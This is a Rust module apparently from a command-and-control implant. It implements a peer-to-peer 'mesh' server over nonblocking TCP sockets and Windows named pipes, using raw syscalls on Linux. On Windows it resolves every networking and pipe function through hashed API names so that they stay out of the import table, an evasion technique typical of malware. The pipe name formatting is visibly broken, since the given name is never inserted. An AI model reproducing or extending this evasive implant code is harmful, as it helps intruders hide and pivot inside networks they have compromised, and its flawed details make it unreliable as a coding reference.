use alloc::vec::Vec;
use crate::utils::syscalls::*;

#[cfg(target_os = "windows")]
use alloc::format;
#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{HANDLE, PVOID, GUID};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct MeshServer {
    #[cfg(not(target_os = "windows"))]
    tcp_socket: Option<usize>,
    #[cfg(target_os = "windows")]
    tcp_socket: Option<HANDLE>,
    #[cfg(target_os = "windows")]
    pipe_handle: Option<HANDLE>,
    pub clients: Vec<MeshClient>,
}

pub struct MeshClient {
    #[cfg(not(target_os = "windows"))]
    pub fd: usize,
    #[cfg(target_os = "windows")]
    pub handle: HANDLE,
    pub is_pipe: bool,
    pub authenticated: bool,
}

impl MeshServer {
    pub fn new() -> Self {
        Self {
            tcp_socket: None,
            #[cfg(target_os = "windows")]
            pipe_handle: None,
            clients: Vec::new(),
        }
    }

    pub fn start_tcp(&mut self, port: u16) -> Result<(), ()> {
        #[cfg(not(target_os = "windows"))]
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 { return Err(()); }

            sys_fcntl(sock, 4, 0o4000); // O_NONBLOCK

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: port.to_be(),
                sin_addr: 0,
                sin_zero: [0; 8],
            };

            if sys_bind(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            if sys_listen(sock, 5) != 0 {
                sys_close(sock);
                return Err(());
            }

            self.tcp_socket = Some(sock);
            Ok(())
        }

        #[cfg(target_os = "windows")]
        unsafe {
            let ws2_32 = hash_str(b"ws2_32.dll");
            let wsa_startup = resolve_function(ws2_32, hash_str(b"WSAStartup"));
            let socket_fn = resolve_function(ws2_32, hash_str(b"socket"));
            let bind_fn = resolve_function(ws2_32, hash_str(b"bind"));
            let listen_fn = resolve_function(ws2_32, hash_str(b"listen"));
            let ioctlsocket = resolve_function(ws2_32, hash_str(b"ioctlsocket"));

            if wsa_startup.is_null() || socket_fn.is_null() || bind_fn.is_null() || listen_fn.is_null() || ioctlsocket.is_null() {
                return Err(());
            }

            type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
            type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> HANDLE;
            type FnBind = unsafe extern "system" fn(HANDLE, *const u8, i32) -> i32;
            type FnListen = unsafe extern "system" fn(HANDLE, i32) -> i32;
            type FnIoctlSocket = unsafe extern "system" fn(HANDLE, i32, *mut u32) -> i32;

            let mut wsa_data = [0u8; 512];
            core::mem::transmute::<_, FnWSAStartup>(wsa_startup)(0x0202, wsa_data.as_mut_ptr());

            let sock = core::mem::transmute::<_, FnSocket>(socket_fn)(2, 1, 0);
            if sock == (-1isize as HANDLE) { return Err(()); }

            let mut mode = 1u32;
            core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(sock, 0x8004667E, &mut mode);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: port.to_be(),
                sin_addr: 0,
                sin_zero: [0; 8],
            };

            if core::mem::transmute::<_, FnBind>(bind_fn)(sock, &addr as *const _ as *const u8, 16) != 0 {
                return Err(());
            }

            if core::mem::transmute::<_, FnListen>(listen_fn)(sock, 5) != 0 {
                return Err(());
            }

            self.tcp_socket = Some(sock);
            Ok(())
        }
    }

    pub fn start_pipe(&mut self, name: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_pipe = resolve_function(kernel32, hash_str(b"CreateNamedPipeA"));
            
            if create_pipe.is_null() { return Err(()); }

            type FnCreateNamedPipeA = unsafe extern "system" fn(
                *const u8, u32, u32, u32, u32, u32, u32, *mut c_void
            ) -> HANDLE;

            let full_name = format!("\\\\.\\pipe\\{{}}", name);
            let handle = core::mem::transmute::<_, FnCreateNamedPipeA>(create_pipe)(
                full_name.as_ptr(),
                3, // PIPE_ACCESS_DUPLEX
                0, // PIPE_TYPE_BYTE
                255,
                8192, 8192, 0, core::ptr::null_mut()
            );

            if handle == (-1isize as HANDLE) { return Err(()); }
            self.pipe_handle = Some(handle);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = name;
            Err(())
        }
    }

    pub fn poll(&mut self) -> Vec<(Vec<u8>, usize)> {
        let mut data_received = Vec::new();
        
        #[cfg(not(target_os = "windows"))]
        if let Some(sock) = self.tcp_socket {
            unsafe {
                let mut addr = SockAddrIn { sin_family: 0, sin_port: 0, sin_addr: 0, sin_zero: [0; 8] };
                let mut addr_len = 16u32;
                let client_fd = sys_accept(sock, &mut addr as *mut _ as *mut u8, &mut addr_len);
                if (client_fd as isize) >= 0 {
                    sys_fcntl(client_fd, 4, 0o4000);
                    self.clients.push(MeshClient { fd: client_fd, is_pipe: false, authenticated: false });
                }
            }
        }

        #[cfg(target_os = "windows")]
        if let Some(sock) = self.tcp_socket {
            unsafe {
                let ws2_32 = hash_str(b"ws2_32.dll");
                let accept_fn = resolve_function(ws2_32, hash_str(b"accept"));
                let ioctlsocket = resolve_function(ws2_32, hash_str(b"ioctlsocket"));
                
                if !accept_fn.is_null() && !ioctlsocket.is_null() {
                    type FnAccept = unsafe extern "system" fn(HANDLE, *mut u8, *mut i32) -> HANDLE;
                    type FnIoctlSocket = unsafe extern "system" fn(HANDLE, i32, *mut u32) -> i32;
                    
                    let mut addr = [0u8; 16];
                    let mut addr_len = 16i32;
                    let client_h = core::mem::transmute::<_, FnAccept>(accept_fn)(sock, addr.as_mut_ptr(), &mut addr_len);
                    
                    if client_h != (-1isize as HANDLE) {
                        let mut mode = 1u32;
                        core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(client_h, 0x8004667E, &mut mode);
                        self.clients.push(MeshClient { handle: client_h, is_pipe: false, authenticated: false });
                    }
                }
            }
        }

        let mut i = 0;
        while i < self.clients.len() {
            let mut remove = false;
            let mut buf = [0u8; 4096];
            let mut n = 0;

            #[cfg(not(target_os = "windows"))]
            unsafe {
                let res = sys_read(self.clients[i].fd, buf.as_mut_ptr(), 4096) as isize;
                if res > 0 {
                    n = res;
                } else if res == 0 {
                    remove = true;
                }
            }

            #[cfg(target_os = "windows")]
            unsafe {
                let ws2_32 = hash_str(b"ws2_32.dll");
                let recv_fn = resolve_function(ws2_32, hash_str(b"recv"));
                if !recv_fn.is_null() {
                    type FnRecv = unsafe extern "system" fn(HANDLE, *mut u8, i32, i32) -> i32;
                    let res = core::mem::transmute::<_, FnRecv>(recv_fn)(self.clients[i].handle, buf.as_mut_ptr(), 4096, 0);
                    if res > 0 {
                        n = res as isize;
                    } else if res == 0 {
                        remove = true;
                    }
                }
            }

            if n > 0 {
                data_received.push((buf[..n as usize].to_vec(), i));
            }

            if remove {
                self.clients.remove(i);
            } else {
                i += 1;
            }
        }

        data_received
    }

    pub fn send_to_client(&self, client_idx: usize, data: &[u8]) {
        if client_idx >= self.clients.len() { return; }
        let client = &self.clients[client_idx];

        #[cfg(not(target_os = "windows"))]
        unsafe {
            sys_write(client.fd, data.as_ptr(), data.len());
        }

        #[cfg(target_os = "windows")]
        unsafe {
            let ws2_32 = hash_str(b"ws2_32.dll");
            let send_fn = resolve_function(ws2_32, hash_str(b"send"));
            if !send_fn.is_null() {
                type FnSend = unsafe extern "system" fn(HANDLE, *const u8, i32, i32) -> i32;
                core::mem::transmute::<_, FnSend>(send_fn)(client.handle, data.as_ptr(), data.len() as i32, 0);
            }
        }
    }
}